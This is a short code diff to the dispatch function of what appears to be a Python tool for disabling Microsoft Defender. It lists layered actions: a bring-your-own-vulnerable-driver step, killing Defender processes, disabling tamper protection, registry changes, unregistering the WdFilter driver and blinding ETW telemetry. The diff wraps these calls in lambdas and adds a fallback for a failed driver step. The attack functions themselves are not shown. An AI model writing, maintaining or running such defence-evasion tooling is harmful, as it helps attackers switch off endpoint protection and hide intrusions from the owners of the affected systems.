@@ -484,12 +484,12 @@ def run(action="all", **kwargs):
     """
     dispatch = {
         "all":        lambda: kill_all(kwargs.get("driver_path"), kwargs.get("skip")),
-        "byovd":      lambda: layer1_byovd(kwargs.get("driver_path"))[1],
-        "kill_procs": layer2_kill_defender,
-        "tamper":     layer3_disable_tamper,
-        "registry":   layer4_registry_disable,
-        "wdfilter":   layer5_unregister_wdfilter,
-        "etw":        layer6_etw_blind,
+        "byovd":      lambda: (layer1_byovd(kwargs.get("driver_path")) or (False, "[!] byovd failed"))[1],
+        "kill_procs": lambda: layer2_kill_defender(),
+        "tamper":     lambda: layer3_disable_tamper(),
+        "registry":   lambda: layer4_registry_disable(),
+        "wdfilter":   lambda: layer5_unregister_wdfilter(),
+        "etw":        lambda: layer6_etw_blind(),
     }
     fn = dispatch.get(action)
     if not fn:
